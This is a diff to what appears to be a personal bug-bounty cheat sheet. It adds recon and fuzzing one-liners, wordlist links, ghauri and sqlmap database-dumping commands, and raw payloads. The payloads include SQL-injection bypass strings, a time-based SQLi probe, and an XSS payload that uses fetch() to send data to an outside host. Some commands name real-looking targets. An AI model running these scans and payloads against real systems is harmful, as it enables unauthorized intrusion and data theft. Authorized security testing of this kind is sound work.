@@ -194,10 +194,95 @@ Amazing method: idor+sql url path+post method+originIp sql bypass+git+env disclo
 -------------------------------------------------------------------------------------
 subfidner -d <REDACTED> -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
 echo https://payment.<REDACTED> | gau
-ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --tech=T
+ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --confirm
 dirsearch -u https://<REDACTED>/ -w payloads/all_attacks.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 --full-url
 shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
 ghauri -r request.txt --dbs --batch --level 3 --tech=t 
 
 waymore -i domain[.]com -mode U -oU waymore_urls.txt
 cat waymore_urls.txt | grep "tld:" | grep -v ":80" | grep -v ":443" | sort -u | uro > juicy.txt
+
+Fuzzing Mastery:
+---------------
+https://osintteam.blog/ffuf-mastery-the-ultimate-web-fuzzing-guide-f7755c396b92
+
+Awesome Wordlists:
+------------------
+https://wordlists.assetnote.io/
+https://github.com/Bo0oM/fuzz.txt
+https://github.com/Karanxa/Bug-Bounty-Wordlists
+https://github.com/fuzzdb-project/fuzzdb
+https://github.com/orwagodfather/WordList
+https://github.com/six2dez/OneListForAll/blob/main/onelistforallmicro.txt
+https://github.com/0xspade/Combined-Wordlists
+https://github.com/YaS5in3/Bug-Bounty-Wordlists
+https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d
+https://github.com/maurosoria/dirsearch/blob/master/db/dicc.txt
+https://github.com/abdallaabdalrhman/Wordlist-for-Bug-Bounty
+https://github.com/Net-hunter121/API-Wordlist
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt
+https://github.com/kaimi-io/web-fuzz-wordlists
+https://github.com/chrislockard/api_wordlist
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/http-request-methods.txt
+https://github.com/assetnote/wordlists/blob/master/data/automated.json
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+https://github.com/n0kovo/awesome-wordlists
+https://github.com/0xPugazh/fuzz4bounty
+https://github.com/gmelodie/awesome-wordlists
+https://gist.github.com/nullenc0de/9cb36260207924f8e1787279a05eb773
+https://gist.github.com/nullenc0de/96fb9e934fc16415fbda2f83f08b28e7#file-content_discovery_nullenc0de-txt
+https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a
+
+Custom Wordlist:
+----------------
+https://github.com/digininja/CeWL
+$ cewl https://example.com/ --header "Cookie: PHPSESSID=2kkadakdajda931ada" -d 5 -m 4
+
+Also Tomnomnom's Tok:
+---------------------
+https://github.com/tomnomnom/hacks/blob/master/tok/main.go
+$ cat urls.txt | ./tok
+
+intitle:"index of" site:*.yourtarget.com
+
+Oneliner: https://github.com/0xPugazh/One-Liners
+
+' or 1=1-- -@xss0r.com/c/lostsec
+'/*!50000OR*/1=1--%20-
+"><img src=x onerror=window.name='xss';fetch(`//xss0r.com/c/lostsec?d=${window.name}`)>
+admin%00' OR 1=1-- -
+
+For Subdomain Enumeration:
+--------------------------
+
+1-Subdomainer(contain sudfinder,amass whois mode,amass passive mode,crt/.sh,GitHub,gobuster,knockpy,)
+2-chaos(Archived Data)
+3-frogy(wayback,bbot,subfinder,findomain,http://crt.sh)
+4-assetfinder (certspotter,hackertarget,threatcrowd,wayback ,bufferover,facebook)
+
+Fuzzing:
+--------
+https://github.com/six2dez/OneListForAll/tree/main
+
+2)Do second subdomain enum for result of first with api key
+subfinder -dL sub |tee subs
+subfinder -dL subs |tee subss
+
+https://github.com/TheGetch/Burp-Suite-Pro-Scan-Profiles
+https://github.com/yubsy/Wordpress-Exploits
+
+echo http://speedway.net.au | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "="
+sqlmap -u 'https://domain.com/blablabla.php?kID=1%27' -p parameter --dbs --delay=3
+
+waybackurls --dates domain(.)com | grep '?id='
+Payload : if(now()=sysdate(),SLEEP(8),0)
+ghauri -u https://......?id=1 --dbs --hostname --current-db
+
+curl -k -s --path-as-is -X GET https://domain.com/x/document.php
+
+For Windows IIS Server: Must Try shortscan, CVE-2024-39677: NHibernate SQL Injection Vulnerability
+
+Subowner - A Simple python based tool to check for subdomain takeovers
+https://github.com/ifconfig-me/subowner
+
+
